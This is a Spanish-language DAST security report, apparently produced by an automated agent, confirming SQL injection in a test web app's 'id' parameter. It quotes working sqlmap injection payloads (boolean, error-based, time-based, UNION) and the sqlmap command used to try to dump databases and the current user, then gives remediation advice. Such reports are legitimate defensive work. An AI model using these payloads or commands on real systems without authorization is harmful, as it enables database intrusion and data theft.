# Informe DAST - SQL Injection

Fecha: 2026-04-27 13:26:52 UTC
Objetivo: http://web.dev.local:8083

## Resumen Ejecutivo
Se detectó una vulnerabilidad de SQL Injection en el parámetro GET `id` del formulario presente en la página raíz. La herramienta sqlmap confirmó múltiples técnicas explotables (boolean-based blind, error-based, time-based y UNION). Se intentó la extracción activa de información (nombres de bases de datos y usuario actual) pero sqlmap no logró recuperar nombres de bases de datos ni credenciales con los intentos realizados.

## Vectores Analizados
- URL/cuerpo: http://web.dev.local:8083/?id=<valor>
- Formulario HTML en la raíz: <form action="#" method="GET"> con input name="id" (campo de búsqueda/ID)

## Hallazgos
- Parámetro vulnerable: id (GET)
- Tecnología detectada: Apache 2.4.65, PHP 8.1.33, back-end DBMS: MySQL (MariaDB fork)

Payloads reportados por sqlmap (ejemplos exactos extraídos de la ejecución):

1) Boolean-based blind
Payload: id=4153' OR NOT 6008=6008-- KHZI&Submit=Submit

2) Error-based
Payload: id=4153' OR (SELECT 9928 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(9928=9928,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aUPR&Submit=Submit

3) Time-based blind
Payload: id=4153' AND (SELECT 6369 FROM (SELECT(SLEEP(5)))lKPY)-- nHYh&Submit=Submit

4) UNION query (partial)
Payload: id=4153' UNION ALL SELECT CONCAT(0x7178717671,0x686a79514a4a4967666c6c4b7769736a77536b597869554e6e56704754587648705a65445a7a6e46,0x717a6b6271),NULL-- -&Submit=Submit

Observaciones de sqlmap:
- Back-end DBMS identificado: MySQL
- sqlmap indicó que pudo identificar múltiples tipos de inyección pero falló al recuperar nombres de bases de datos ("unable to retrieve the number of databases").
- Los resultados y registros completos de sqlmap fueron guardados en: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local

## Evidencia de Explotación
- Detección: sqlmap reportó los tipos de inyección y listó los payloads (ver sección Hallazgos).
- Intentos de extracción:
  - Ejecución con: sqlmap -u "http://web.dev.local:8083/?id=1" --batch --dbs --current-user --threads=2 --level=3 --risk=2
  - Resultado: sqlmap no pudo recuperar nombres de bases de datos ni el usuario de forma fiable (errores durante la técnica UNION y caída a técnicas parciales; fallos en recuperación con time-based en multi-threading).
- No se extrajeron usuarios ni contraseñas durante las pruebas automatizadas realizadas.

Fragmento relevante del output de sqlmap:

"Parameter: id (GET)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)\n    Payload: id=4153' OR NOT 6008=6008-- KHZI&Submit=Submit\n\n    Type: error-based\n    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=4153' OR (SELECT 9928 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(9928=9928,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aUPR&Submit=Submit\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=4153' AND (SELECT 6369 FROM (SELECT(SLEEP(5)))lKPY)-- nHYh&Submit=Submit\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 2 columns\n    Payload: id=4153' UNION ALL SELECT CONCAT(...),NULL-- -&Submit=Submit"

## Conclusión
- VULNERABILIDAD: Confirmada (SQL Injection en parámetro `id`).
- EXPLOTACIÓN: Intentada pero no completada en cuanto a extracción de credenciales o listado completo de bases de datos; por lo tanto no se obtuvieron usuarios/contraseñas en las ejecuciones automatizadas.

## Recomendaciones
1. Implementar consultas parametrizadas (prepared statements) / ORM para todas las entradas que interactúan con la base de datos.
2. Validación y saneamiento estricto del parámetro `id` (ej. aceptar solo dígitos si corresponde a un identificador numérico).
3. Aplicar WAF y reglas que bloqueen payloads de inyección conocidos (de forma temporal mientras se parchea la aplicación).
4. Revisar y endurecer permisos de la cuenta de la base de datos (principio de menor privilegio).
5. Actualizar sqlmap y repetir pruebas manuales y con herramientas para intentar extracción controlada bajo condiciones seguras si es necesario para auditoría.

---
Informe generado automáticamente por agente DAST.
